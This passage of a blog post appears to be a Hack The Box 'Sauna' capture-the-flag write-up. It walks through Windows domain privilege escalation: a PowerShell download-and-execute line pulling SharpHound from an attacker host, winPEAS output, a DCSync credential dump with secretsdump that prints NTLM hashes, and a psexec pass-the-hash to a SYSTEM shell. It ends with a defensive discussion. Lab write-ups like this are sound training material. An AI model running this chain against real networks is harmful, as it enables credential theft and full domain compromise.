+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\F</span>Smith<span style="color:#79c0ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>egotisticalbank<span style="color:#79c0ff">\f</span>smith
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\F</span>Smith<span style="color:#79c0ff">\D</span>ocuments&gt; 
+</span></span></code></pre></div><h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Once on the box, I downloaded and ran winPEAS, which revealed some credentials stored within the registry:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\FSmith\Documents&gt; gc winpeas.<span style="color:#79c0ff">txt</span>
+</span></span><span style="display:flex;"><span>            *((,.,/((((((((((((((((((((/,  */
+</span></span><span style="display:flex;"><span>     ,/*,..*(((((((((((((((((((((((((((((((((,
+</span></span><span style="display:flex;"><span>   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
+</span></span><span style="display:flex;"><span>   ((((((((((((((((* *****,,,/<span style="color:#8b949e;font-style:italic">########## .(* ,((((((</span>
+</span></span><span style="display:flex;"><span>   (((((((((((/* ******************/<span style="color:#8b949e;font-style:italic">####### .(. ((((((</span>
+</span></span><span style="display:flex;"><span>   ((((((..******************/@@@@@/***/<span style="color:#8b949e;font-style:italic">######* /((((((</span>
+</span></span><span style="display:flex;"><span>   ,,..**********************@@@@@@@@@@(***,<span style="color:#8b949e;font-style:italic">#### ../(((((</span>
+</span></span><span style="display:flex;"><span>   , ,**********************<span style="color:#8b949e;font-style:italic">#@@@@@#@@@@*********##((/ /((((</span>
+</span></span><span style="display:flex;"><span>   ..(((<span style="color:#8b949e;font-style:italic">##########*********/#@@@@@@@@@/*************,,..((((</span>
+</span></span><span style="display:flex;"><span>   .(((<span style="color:#8b949e;font-style:italic">################(/******/@@@@@#****************.. /((</span>
+</span></span><span style="display:flex;"><span>   .((<span style="color:#8b949e;font-style:italic">########################(/************************..*(</span>
+</span></span><span style="display:flex;"><span>   .((<span style="color:#8b949e;font-style:italic">#############################(/********************.,(</span>
+</span></span><span style="display:flex;"><span>   .((<span style="color:#8b949e;font-style:italic">##################################(/***************..(</span>
+</span></span><span style="display:flex;"><span>   .((<span style="color:#8b949e;font-style:italic">######################################(************..(</span>
+</span></span><span style="display:flex;"><span>   .((<span style="color:#8b949e;font-style:italic">######(,.***.,(###################(..***(/*********..(</span>
+</span></span><span style="display:flex;"><span>  .((<span style="color:#8b949e;font-style:italic">######*(#####((##################((######/(********..(</span>
+</span></span><span style="display:flex;"><span>   .((<span style="color:#8b949e;font-style:italic">##################(/**********(################(**...(</span>
+</span></span><span style="display:flex;"><span>   .(((<span style="color:#8b949e;font-style:italic">####################/*******(###################.((((</span>
+</span></span><span style="display:flex;"><span>   .(((((<span style="color:#8b949e;font-style:italic">############################################/  /((</span>
+</span></span><span style="display:flex;"><span>   ..(((((<span style="color:#8b949e;font-style:italic">#########################################(..(((((.</span>
+</span></span><span style="display:flex;"><span>   ....(((((<span style="color:#8b949e;font-style:italic">#####################################( .((((((.</span>
+</span></span><span style="display:flex;"><span>   ......(((((<span style="color:#8b949e;font-style:italic">#################################( .(((((((.</span>
+</span></span><span style="display:flex;"><span>   (((((((((. ,(<span style="color:#8b949e;font-style:italic">############################(../(((((((((.</span>
+</span></span><span style="display:flex;"><span>       (((((((((/,  ,<span style="color:#8b949e;font-style:italic">####################(/..((((((((((.</span>
+</span></span><span style="display:flex;"><span>             (((((((((/,.  ,*//////*,. ./(((((((((((.
+</span></span><span style="display:flex;"><span>                (((((((((((((((((((((((((((/<span style="color:#a5d6ff">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">                       by carlospolop
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">ECHO is off.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">Advisory: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner&#39;s permission.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">ECHO is off.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">[...]
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">User accounts for \\
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">-------------------------------------------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">Administrator            FSmith                   Guest
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">HSmith                   krbtgt                   svc_loanmgr
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">The command completed with one or more errors.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">[...]
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt; [+] Files an registry that may contain credentials 
+</span></span></span></code></pre></div><p>Logging in as that user, I performed some additional enumeration. Running Bloodhound revealed that the <code>svc_loanmgr</code> account had both the GetChanges and GetChangesAll privilege. This means that the account can perform a DCSync attack. In simple terms, a DCSync attack is where a user with the aforementioned permissions can impersonate a domain controller and utilize MS-DRSR (Directory Replication Service Remote Protocol) to obtain a dump of all user credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\svc_loanmgr\Documents&gt; iex(New-Object System.<span style="color:#79c0ff">net</span>.WebClient).<span style="color:#79c0ff">DownloadString</span>(<span style="color:#a5d6ff">&#34;http://10.10.14.42/SharpHound.ps1&#34;</span>); Invoke-BloodHound -CollectionMethod all
+</span></span><span style="display:flex;"><span>PS C:\Users\svc_loanmgr\Documents&gt; gci
+</span></span><span style="display:flex;"><span>Directory<span style="color:#f85149">:</span> C:\Users\svc_loanmgr\Documents
+</span></span><span style="display:flex;"><span>Mode LastWriteTime Length Name
+</span></span><span style="display:flex;"><span>---- ------------- ------ ----
+</span></span><span style="display:flex;"><span>-a---- <span style="color:#a5d6ff">6</span>/<span style="color:#a5d6ff">9</span>/<span style="color:#a5d6ff">2020</span> <span style="color:#a5d6ff">3</span><span style="color:#f85149">:</span><span style="color:#a5d6ff">38</span> AM <span style="color:#a5d6ff">9134</span> 20200609033845_BloodHound.<span style="color:#79c0ff">zip</span>
+</span></span><span style="display:flex;"><span>-a---- <span style="color:#a5d6ff">6</span>/<span style="color:#a5d6ff">9</span>/<span style="color:#a5d6ff">2020</span> <span style="color:#a5d6ff">3</span><span style="color:#f85149">:</span><span style="color:#a5d6ff">38</span> AM <span style="color:#a5d6ff">11122</span> ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.<span style="color:#79c0ff">bin</span>
+</span></span><span style="display:flex;"><span>PS C:\Users\svc_loanmgr\Documents&gt; certutil -encode 20200609033845_BloodHound.<span style="color:#79c0ff">zip</span> blood.<span style="color:#79c0ff">b64</span>
+</span></span><span style="display:flex;"><span>Input Length = <span style="color:#a5d6ff">9134</span>
+</span></span><span style="display:flex;"><span>Output Length = <span style="color:#a5d6ff">12618</span>
+</span></span><span style="display:flex;"><span>CertUtil<span style="color:#f85149">:</span> -encode command completed successfully.
+</span></span><span style="display:flex;"><span>PS C:\Users\svc_loanmgr\Documents&gt; ls
+</span></span><span style="display:flex;"><span>Directory<span style="color:#f85149">:</span> C:\Users\svc_loanmgr\Documents
+</span></span><span style="display:flex;"><span>Mode LastWriteTime Length Name
+</span></span><span style="display:flex;"><span>---- ------------- ------ ----
+</span></span><span style="display:flex;"><span>-a---- <span style="color:#a5d6ff">6</span>/<span style="color:#a5d6ff">9</span>/<span style="color:#a5d6ff">2020</span> <span style="color:#a5d6ff">3</span><span style="color:#f85149">:</span><span style="color:#a5d6ff">38</span> AM <span style="color:#a5d6ff">9134</span> 20200609033845_BloodHound.<span style="color:#79c0ff">zip</span>
+</span></span><span style="display:flex;"><span>-a---- <span style="color:#a5d6ff">6</span>/<span style="color:#a5d6ff">9</span>/<span style="color:#a5d6ff">2020</span> <span style="color:#a5d6ff">3</span><span style="color:#f85149">:</span><span style="color:#a5d6ff">42</span> AM <span style="color:#a5d6ff">12618</span> blood.<span style="color:#79c0ff">b64</span>
+</span></span><span style="display:flex;"><span>-a---- <span style="color:#a5d6ff">6</span>/<span style="color:#a5d6ff">9</span>/<span style="color:#a5d6ff">2020</span> <span style="color:#a5d6ff">3</span><span style="color:#f85149">:</span><span style="color:#a5d6ff">38</span> AM <span style="color:#a5d6ff">11122</span> ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.<span style="color:#79c0ff">bin</span>
+</span></span><span style="display:flex;"><span>PS C:\Users\svc_loanmgr\Documents&gt; gc blood.<span style="color:#79c0ff">b64</span>
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>matt<span style="color:#79c0ff">@kali</span><span style="color:#f85149">:</span>~/htb/Sauna/www$ unzip decoded.<span style="color:#79c0ff">zip</span>
+</span></span><span style="display:flex;"><span>Archive<span style="color:#f85149">:</span> decoded.<span style="color:#79c0ff">zip</span>
+</span></span><span style="display:flex;"><span>inflating<span style="color:#f85149">:</span> 20200609033845_groups.<span style="color:#79c0ff">json</span>
+</span></span><span style="display:flex;"><span>inflating<span style="color:#f85149">:</span> 20200609033845_users.<span style="color:#79c0ff">json</span>
+</span></span><span style="display:flex;"><span>inflating<span style="color:#f85149">:</span> 20200609033845_gpos.<span style="color:#79c0ff">json</span>
+</span></span><span style="display:flex;"><span>inflating<span style="color:#f85149">:</span> 20200609033845_ous.<span style="color:#79c0ff">json</span>
+</span></span><span style="display:flex;"><span>inflating<span style="color:#f85149">:</span> 20200609033845_domains.<span style="color:#79c0ff">json</span>
+</span></span><span style="display:flex;"><span>inflating<span style="color:#f85149">:</span> 20200609033845_computers.<span style="color:#79c0ff">json</span>
+</span></span><span style="display:flex;"><span>matt<span style="color:#79c0ff">@kali</span><span style="color:#f85149">:</span>~/htb/Sauna/www$ ls
+</span></span><span style="display:flex;"><span>20200609033845_computers.<span style="color:#79c0ff">json</span> 20200609033845_domains.<span style="color:#79c0ff">json</span> 20200609033845_gpos.<span style="color:#79c0ff">json</span> 20200609033845_groups.<span style="color:#79c0ff">json</span> 20200609033845_ous.<span style="color:#79c0ff">json</span> 20200609033845_users.<span style="color:#79c0ff">json</span> bloodhound.<span style="color:#79c0ff">zip</span> blood.<span style="color:#79c0ff">zip</span> decoded.<span style="color:#79c0ff">zip</span>
+</span></span><span style="display:flex;"><span>matt<span style="color:#79c0ff">@kali</span><span style="color:#f85149">:</span>~/htb/Sauna/www$
+</span></span><span style="display:flex;"><span>matt<span style="color:#79c0ff">@kali</span><span style="color:#f85149">:</span>~/htb/Sauna/www$
+</span></span></code></pre></div><p><img src="bloodhound.png" alt=""></p>
+<p>In order to exploit this misconfiguration, I used Impacket&rsquo;s <code>secretsdump.py</code> to dump the credentials and <code>psexec.py</code> to get a root shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:/opt/impacket-0.9.21/examples$ ./secretsdump.py -just-dc-ntlm egotistical-bank.local/svc_loanmgr@10.10.10.175
+</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright <span style="color:#a5d6ff">2020</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Dumping Domain Credentials <span style="color:#ff7b72;font-weight:bold">(</span>domain<span style="color:#79c0ff">\u</span>id:rid:lmhash:nthash<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#79c0ff">\H</span>Smith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#79c0ff">\F</span>Smith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#79c0ff">\s</span>vc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+</span></span><span style="display:flex;"><span>SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:dc706723e3073a8f4d3f438ec5af098e:::
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Cleaning up...
+</span></span><span style="display:flex;"><span>matt@kali:/opt/impacket-0.9.21/examples$ ./psexec.py -hashes d9485863c1e9e05851aa40cbb4ab9dff:d9485863c1e9e05851aa40cbb4ab9dff Administrator@10.10.10.175
+</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright <span style="color:#a5d6ff">2020</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Requesting shares on 10.10.10.175.....
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Found writable share ADMIN$
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Uploading file kElNynoN.exe
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Opening SVCManager on 10.10.10.175.....
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Creating service MmEB on 10.10.10.175.....
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Starting service MmEB.....
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> Press help <span style="color:#ff7b72">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#ff7b72;font-weight:bold">[</span>Version 10.0.17763.973<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>c<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#a5d6ff">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\W</span>indows<span style="color:#79c0ff">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#79c0ff">\s</span>ystem
+</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\W</span>indows<span style="color:#79c0ff">\s</span>ystem32&gt;hostname    
+</span></span><span style="display:flex;"><span>SAUNA    
+</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\W</span>indows<span style="color:#79c0ff">\s</span>ystem32&gt;
+</span></span></code></pre></div><h1 id="discussion">
+  Discussion
+  <a class="heading-link" href="#discussion">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>This machine features a number of misconfigurations and fundamental weaknesses of various protocols used within AD environments, which makes the box both an interesting case study and a useful discussion topic.</p>
+<h2 id="topic-1-asreproastable">
+  Topic #1: ASREPRoastable
+  <a class="heading-link" href="#topic-1-asreproastable">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>The first mistake relates to the ASREPRoast attack. Monimoy Sanyal, a principal architect at Microsoft, <a href="https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx"  class="external-link" target="_blank" rel="noopener">has previously written about why Kerberos pre-authentication should not be disabled</a> so I won&rsquo;t delve too much into that. Basically, when pre-authentication is disabled, any user can request a ticket-granting ticket (TGT) in plain text. When the Kerberos service sends back the encrypted TGT, a malicious actor can simply take the ticket offline and crack the user&rsquo;s password. Technically speaking, this sort of operation would similarly be possible if pre-authentication was required, but that would require the actor to perform a man-in-the-middle attack.</p>
+<p>In most cases, there is no reason for pre-authentication to be disabled. Microsoft even enables it by default, which is an impressive feat for a company so indifferent to its operating system&rsquo;s <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm"  class="external-link" target="_blank" rel="noopener">insecure</a> <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always"  class="external-link" target="_blank" rel="noopener">default</a> <a href="https://www.crowe.com/cybersecurity-watch/netbios-llmnr-giving-away-credentials"  class="external-link" target="_blank" rel="noopener">configurations</a> (those are three different links). Often times, pre-authentication is disabled due to legacy support. In some cases, this may be necessary. In those cases, password requirements need to be extremely strong, security event monitoring devices need to be configured to record and alert on plaintext TGT requests from unusual hosts, the scope of the pre-authentication disablement needs to be very limited, and accounts configured this way should be subject to regular review. There&rsquo;s simply no other way to prevent this attack.</p>
+<h2 id="topic-2-domain-object-privileges--ms-drsr">
+  Topic #2: Domain Object Privileges &amp; MS-DRSR
+  <a class="heading-link" href="#topic-2-domain-object-privileges--ms-drsr">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>The path to root, as well as the corresponding credential dump, was paved by an account with excessive and poorly thought out privileges. Beyond the obvious, the only thing I have to add is that security audits and reviews should not only feature group members (as is often the case), but also group and user privileges. An organization that truly follows the principle of least privilege needs to ensure that there are no blind spots that could allow a user, regardless of intent, more rights than are necessary. It&rsquo;s easy to blame MS-DRSR, but its functionality is rooted in necessity. This was fundamentally a case of excess privilege.</p>
+<h2 id="topic-3-beyond-root">
+  Topic #3: Beyond Root
+  <a class="heading-link" href="#topic-3-beyond-root">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Beyond getting access as <code>NT AUTHORITY\SYSTEM</code> (or <code>Administrator</code>, if you used crackmapexec), what could a malicious actor do based on the vulnerabilities noted? For one, they could establish a level of persistence that would cause even the most well-run security programs headaches. With the <code>krbtgt</code> user&rsquo;s NTLM hash, it&rsquo;s possible to create a golden ticket. If one has a golden ticket, they could impersonate any and every user in the domain regardless of whether or not they know the password. Compounding this problem, the only remediation strategy is to change the password for the <code>krbtgt</code> account… <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password"  class="external-link" target="_blank" rel="noopener">Twice</a>. This may or may not break services in the environment. Fortunately, <a href="https://www.microsoft.com/security/blog/2015/02/11/krbtgt-account-password-reset-scripts-now-available-for-customers/"  class="external-link" target="_blank" rel="noopener">Microsoft has a script</a> for safely resetting the <code>krbtgt</code> account&rsquo;s credentials.</p>
+<p>Other methods for persistence include DCShadow, ACL persistence, and setting up backdoors using programs like Empire or Merlin. Additionally, you then have to worry about abusing domain trusts to gain (often times elevated) access to other domains within an organization. In conclusion, security personnel need to understand the risks associated with AD and continuously monitor and audit these risks, whether internally or externally (e.g. security audit, penetration test, etc.).</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2020 -
+    
+    2025
+     matt johnson 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
